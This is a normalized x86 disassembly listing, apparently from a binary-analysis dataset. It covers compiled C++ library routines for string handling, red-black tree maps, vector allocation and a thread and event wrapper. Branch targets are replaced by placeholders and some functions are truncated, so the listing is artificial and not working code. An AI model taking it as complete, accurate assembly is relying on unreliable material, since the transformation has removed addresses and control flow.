mov ecx [ esp + 0x54 ]
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x10
lea eax [ esp + 0x24 ]
movsx ebp [ ebx + 0x6 ]
mov ecx [ edx ]
add ecx esi
sub ebp eax
mov [ edi + ebp * 4 - 0x4 ] ecx
mov ecx [ edx + 0x8 ]
inc eax
add esi 0x10
cmp eax ecx
jb r-xdata
sub_41a660
push esi
push edi
xor edi edi
push edi
push edi
push edi
mov esi ecx
push edi
mov [ esi + 0x30 ] 0x1
call [ CreateEventW@IAT ]
cmp eax edi
mov [ esi + 0x38 ] eax
jne r-xdata
lea eax [ esi + 0x3c ]
push eax
push edi
push esi
push sub_41a470
push edi
push edi
call [ CreateThread@IAT ]
cmp eax edi
mov [ esi + 0x34 ] eax
jne r-xdata
mov [ esi + 0x30 ] edi
mov edx [ esi + 0x38 ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
cmp [ esi + 0x30 ] edi
jne r-xdata
mov ecx [ esi + 0x38 ]
push ecx
mov [ esi + 0x30 ] edi
call [ CloseHandle@IAT ]
mov [ esi + 0x38 ] edi
pop edi
pop esi
retn
pop edi
pop esi
retn
mov eax [ esi + 0x38 ]
push eax
call [ CloseHandle@IAT ]
mov [ esi + 0x38 ] edi
sub_41a730
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call [ DeleteCriticalSection@IAT ]
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_41a790
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ecx + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
retn
retn
sub_41a800
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ecx + 0xc ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
retn
retn
sub_41a980
mov edx [ esp + 0x4 ]
mov eax [ edx ]
push ebx
push esi
mov esi [ eax + 0x8 ]
mov [ edx ] esi
mov esi [ eax + 0x8 ]
mov bl [ esi + 0x39 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_41aa60
mov eax [ ecx ]
mov dl [ eax + 0x39 ]
test dl dl
je r-xdata
mov edx [ eax ]
push ebx
mov bl [ edx + 0x39 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
retn
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x39 ]
test dl dl
jne r-xdata
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x39 ]
test bl bl
jne r-xdata
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] edx
pop ebx
retn
mov edx eax
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x39 ]
test bl bl
je r-xdata
mov dl [ eax + 0x39 ]
test dl dl
jne r-xdata
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x39 ]
test dl dl
je r-xdata
mov [ ecx ] eax
mov edx [ ecx ]
cmp edx [ eax ]
jne r-xdata
sub_41aac0
mov eax [ ecx ]
mov dl [ eax + 0x39 ]
test dl dl
jne r-xdata
retn
mov edx [ eax + 0x8 ]
push ebx
mov bl [ edx + 0x39 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x39 ]
test dl dl
jne r-xdata
mov eax [ edx ]
mov bl [ eax + 0x39 ]
test bl bl
jne r-xdata
mov [ ecx ] eax
pop ebx
lea esp [ esp ]
mov [ ecx ] edx
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x39 ]
test dl dl
je r-xdata
mov edx eax
mov eax [ edx ]
mov bl [ eax + 0x39 ]
test bl bl
je r-xdata
mov edx [ ecx ]
cmp edx [ eax + 0x8 ]
jne r-xdata
sub_41abb0
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebx
je r-xdata
mov eax [ esp + 0x14 ]
pop esi
pop ebx
retn
push edi
mov edi [ esp + 0x18 ]
push esi
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
add esi 0x1c
add edi 0x1c
cmp esi ebx
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_41ace0
mov eax [ ecx + 0x4 ]
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi eax
mov al [ esi + 0x39 ]
test al al
jne r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push ebx
mov ebx [ esp + 0x10 ]
push ebp
mov ebp [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
lea ecx [ ecx ]
mov edi esi
mov esi [ esi ]
mov esi [ esi + 0x8 ]
jmp r-xdata
lea eax [ esi + 0xc ]
push ebx
push eax
call ebp
add esp 0x8
test al al
je r-xdata
pop ebp
pop ebx
mov al [ esi + 0x39 ]
test al al
je r-xdata
sub_41ad80
push 0xffffffff
push sub_431aa1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push r--data
lea ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x4c ] 0x0
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
call sub_403eb0
mov [ esp + 0x4c ] 0x1
mov [ esp + 0x1c ] r--data
mov [ esp + 0x4c ] 0x0
push r--data
lea ecx [ esp + 0x20 ]
push ecx
call _CxxThrowException
sub_41adf0
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x8 ]
push ebx
push esi
mov esi [ eax ]
mov [ edx + 0x8 ] esi
mov esi [ eax ]
mov bl [ esi + 0x39 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_41af10
push 0xffffffff
push sub_431ac1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov ecx [ esp + 0x14 ]
mov [ esp ] ecx
mov [ esp + 0xc ] 0x0
test ecx ecx
je r-xdata
mov [ esp + 0xc ] 0xffffffff
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esp + 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_41afb0
push esi
xor eax eax
push edi
mov edi [ esp + 0xc ]
cmp edi eax
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
jne r-xdata
cmp edi 0x9249249
jbe r-xdata
pop edi
xor al al
pop esi
retn 0x4
imul edi edi 0x1c
push edi
call sub_42e3bc
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_41ad80
sub_41b0a0
push ecx
push esi
push edi
mov edi [ esp + 0x14 ]
push edi
mov esi ecx
call sub_41ace0
cmp eax [ esi + 0x4 ]
mov [ esp + 0x14 ] eax
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x8 ]
mov ecx [ eax ]
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] ecx
pop esi
pop ecx
retn 0x8
add eax 0xc
push eax
push edi
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
jne r-xdata
lea eax [ esp + 0x14 ]
mov ecx [ eax ]
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] ecx
pop esi
pop ecx
retn 0x8
sub_41b120
push ebp
mov ebp esp
push 0xffffffff
push sub_431ad0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x3c
call sub_42e3bc
add esp 0x4
mov [ ebp - 0x18 ] eax
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x20 ] eax
cmp eax edx
je r-xdata
mov ebx 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x24 ] edx
lea ecx [ eax + 0x4 ]
mov [ ebp - 0x28 ] ecx
cmp ecx edx
je r-xdata
mov [ eax ] edx
mov [ ebp - 0x14 ] 0x2
mov [ ebp - 0x2c ] edx
lea ecx [ eax + 0x8 ]
mov [ ebp - 0x30 ] ecx
cmp ecx edx
je r-xdata
mov [ ecx ] edx
mov [ ebp - 0x4 ] 0xffffffff
mov [ eax + 0x38 ] bl
mov [ eax + 0x39 ] dl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ecx ] edx
sub_41b1c0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn
mov edi edi
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
add esi 0x1c
cmp esi edi
jne r-xdata
sub_41b1f0
push ebp
mov ebp esp
push 0xffffffff
push sub_431ae0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
push edi
mov ecx ebx
call sub_41b080
add edi 0x1c
mov [ ebp + 0x10 ] edi
add esi 0x1c
mov [ ebp + 0x8 ] esi
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_41b280
push ebp
mov ebp esp
push 0xffffffff
push sub_431af0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
push edi
mov ecx ebx
call sub_41b080
add edi 0x1c
mov [ ebp + 0x10 ] edi
add esi 0x1c
mov [ ebp + 0x8 ] esi
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_41b310
push 0xffffffff
push sub_431b22
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
xor ebx ebx
mov [ esp + 0xc ] ebx
push rw-data
mov esi ecx
mov [ esp + 0x14 ] rw-data
call [ EnterCriticalSection@IAT ]
mov edi 0x1
mov [ esp + 0x1c ] edi
mov eax [ esp + 0x28 ]
push eax
lea ecx [ esp + 0x2c ]
push ecx
lea ecx [ esi + 0x4 ]
call sub_41b0a0
mov esi [ esi + 0x8 ]
mov eax [ esp + 0x28 ]
cmp eax esi
je r-xdata
mov esi [ esp + 0x24 ]
mov ecx esi
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov esi [ eax + 0x2c ]
cmp esi ebx
je r-xdata
mov ecx [ eax + 0x30 ]
sub ecx esi
mov eax 0x92492493
imul ecx
mov eax [ esp + 0x2c ]
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp eax ecx
jae r-xdata
imul eax eax 0x1c
add eax esi
mov esi [ esp + 0x24 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
mov [ esp + 0xc ] edi
mov [ esp + 0x1c ] bl
push rw-data
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0x14 ]
pop edi
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0xc
sub_41b3f0
push 0xffffffff
push sub_431b38
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push rw-data
mov esi ecx
mov [ esp + 0x8 ] rw-data
call [ EnterCriticalSection@IAT ]
mov [ esp + 0x10 ] 0x0
mov eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
lea ecx [ esi + 0x4 ]
call sub_41b0a0
mov esi [ esi + 0x8 ]
mov eax [ esp + 0x18 ]
cmp eax esi
je r-xdata
mov [ esp + 0x10 ] 0xffffffff
push rw-data
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0x8 ]
xor eax eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
mov edx [ eax + 0x2c ]
test edx edx
jne r-xdata
mov ecx [ eax + 0x30 ]
sub ecx edx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
xor esi esi
jmp r-xdata
mov [ esp + 0x10 ] 0xffffffff
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax esi
pop esi
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_41b4c0
push esi
mov esi ecx
call sub_41b120
mov [ esi + 0x4 ] eax
mov [ eax + 0x39 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
pop esi
retn
sub_41b4f0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn
mov edi edi
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
add esi 0x1c
cmp esi edi
jne r-xdata
sub_41b520
push ecx
mov eax [ esp ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
call sub_41b1f0
add esp 0x18
retn
sub_41b550
push ecx
mov eax [ esp ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
call sub_41b280
add esp 0x18
retn
sub_41b580
push esi
mov esi ecx
call sub_41b120
mov [ esi + 0x4 ] eax
mov [ eax + 0x39 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
retn 0x8
sub_41b5b0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn 0x8
mov edi edi
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
add esi 0x1c
cmp esi edi
jne r-xdata
sub_41b5e0
push ebx
mov ebx ecx
push esi
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0xc ] 0x0
pop ebx
retn
push edi
mov edi [ ebx + 0x8 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
pop edi
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
add esi 0x1c
cmp esi edi
jne r-xdata
sub_41b670
push ebp
mov ebp esp
push 0xffffffff
push sub_431b50
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
xor edi edi
cmp eax edi
jne r-xdata
mov ecx [ ebx + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp eax 0x9249249
jbe r-xdata
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
cmp eax edi
je r-xdata
mov edi eax
imul edi edi 0x1c
push edi
call sub_42e3bc
add esp 0x4
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
add edi eax
mov [ esi + 0xc ] edi
mov [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] eax
mov ecx [ ebx + 0x4 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x24 ] ecx
mov edx [ esi + 0x4 ]
push edx
push eax
push ecx
mov ecx esi
call sub_41b630
mov [ esi + 0x8 ] eax
mov ecx esi
call sub_41ad80
sub_41b760
push 0xffffffff
push sub_431b74
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x1c ]
call sub_41b5e0
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_41b7b0
push 0xffffffff
push sub_431b94
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
push eax
mov [ esp + 0x8 ] esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0x0
mov ecx [ esp + 0x1c ]
push ecx
lea ecx [ esi + 0x1c ]
call sub_41b670
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x8
sub_41b820
push 0xffffffff
push sub_431bb4
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
mov edi [ esp + 0x1c ]
mov esi ecx
push edi
mov [ esp + 0xc ] esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x14 ] 0x0
add edi 0x1c
push edi
lea ecx [ esi + 0x1c ]
call sub_41b670
mov [ esp + 0x14 ] 0xffffffff
mov ecx [ esp + 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_41b880
push 0xffffffff
push sub_431bcb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
add ecx 0xc
call sub_41b760
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_41b8c0
push ebp
mov ebp [ esp + 0x8 ]
push esi
mov esi ecx
cmp esi ebp
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax [ ebp + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_41b5e0
mov eax esi
pop esi
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push ebx
mov ebx [ esi + 0x4 ]
test ebx ebx
push edi
jne r-xdata
mov edi [ esi + 0x8 ]
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
xor eax eax
jmp r-xdata
test ebx ebx
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push ebx
push eax
mov eax [ ebp + 0x4 ]
push eax
call sub_41abb0
mov ecx [ esi + 0x8 ]
add esp 0x10
push ecx
push eax
mov ecx esi
call sub_41b5b0
mov eax [ ebp + 0x4 ]
test eax eax
jne r-xdata
cmp ecx eax
ja r-xdata
mov edi [ esi + 0xc ]
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
mov ecx [ esi + 0x4 ]
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
imul eax eax 0x1c
pop edi
add eax ecx
mov [ esi + 0x8 ] eax
pop ebx
mov eax esi
pop esi
pop ebp
retn 0x4
mov ecx [ esi + 0x4 ]
imul eax eax 0x1c
pop edi
add eax ecx
mov [ esi + 0x8 ] eax
pop ebx
mov eax esi
pop esi
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov ecx esi
call sub_41a790
mov edx [ esp + 0x14 ]
mov edi eax
mov eax [ ebp + 0x4 ]
imul edi edi 0x1c
push edx
add edi eax
push ebx
push edi
push eax
call sub_41abb0
mov ecx [ esp + 0x24 ]
mov eax [ esi + 0x8 ]
mov ebp [ ebp + 0x8 ]
push ecx
push esi
push eax
push ebp
push edi
call sub_41b280
add esp 0x24
pop edi
mov [ esi + 0x8 ] eax
pop ebx
mov eax esi
pop esi
pop ebp
retn 0x4
cmp ecx eax
ja r-xdata
mov ecx ebp
call sub_41a790
push eax
mov ecx esi
call sub_41afb0
test al al
je r-xdata
mov edx [ esi + 0x8 ]
push edx
push ebx
mov ecx esi
call sub_41b5b0
mov eax [ esi + 0x4 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop ebx
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x4 ]
push ecx
push edx
push eax
mov ecx esi
call sub_41b650
mov [ esi + 0x8 ] eax
sub_41ba50
push 0xffffffff
push sub_431beb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x1c ]
push esi
mov esi ecx
mov ecx [ esp + 0x1c ]
mov [ esi ] eax
mov eax [ esp + 0x24 ]
mov [ esi + 0x4 ] ecx
push eax
lea ecx [ esi + 0xc ]
mov [ esp + 0x8 ] esi
mov [ esi + 0x8 ] edx
call sub_41b820
xor eax eax
mov [ esp + 0x10 ] eax
mov cl [ esp + 0x28 ]
mov [ esi + 0x38 ] cl
mov [ esi + 0x39 ] al
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x14
sub_41bae0
push ebp
mov ebp esp
push 0xffffffff
push sub_431c11
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x3c
call sub_42e3bc
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
xor eax eax
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx esi
call sub_41ba50
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_41bb90
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_431c29
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x5d1745c
jb r-xdata
mov edx [ esp + 0x64 ]
mov eax [ edi + 0x4 ]
push ebx
push esi
mov esi [ esp + 0x68 ]
push 0x0
push edx
push eax
push esi
push eax
mov ecx edi
call sub_41bae0
mov ebx [ edi + 0x8 ]
mov ecx eax
mov eax [ edi + 0x4 ]
inc ebx
cmp esi eax
mov [ esp + 0x6c ] ecx
mov [ edi + 0x8 ] ebx
jne r-xdata
push r--data
lea ecx [ esp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x50 ] 0x0
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x24 ]
call sub_403fa0
push r--data
lea ecx [ esp + 0x24 ]
push ecx
call _CxxThrowException
mov al [ esp + 0x64 ]
test al al
je r-xdata
mov [ eax + 0x4 ] ecx
mov eax [ edi + 0x4 ]
mov [ eax ] ecx
mov edx [ edi + 0x4 ]
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov [ esi + 0x8 ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov [ esi ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x38 ] 0x0
lea eax [ ecx + 0x4 ]
mov esi ecx
mov bl 0x1
jne r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ esp + 0x60 ]
mov [ edx + 0x38 ] bl
pop esi
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
pop ebx
pop edi
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x10
push ebp
mov edi edi
cmp [ edx + 0x38 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x38 ] 0x0
jne r-xdata
mov ecx [ eax ]
mov [ ecx + 0x38 ] bl
mov [ edx + 0x38 ] bl
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x38 ] 0x0
mov edx [ eax ]
mov esi [ edx + 0x4 ]
jmp r-xdata
cmp esi [ ecx ]
jne r-xdata
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov edx [ esi + 0x4 ]
mov cl [ edx + 0x38 ]
test cl cl
lea eax [ esi + 0x4 ]
je r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0x38 ] bl
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x38 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
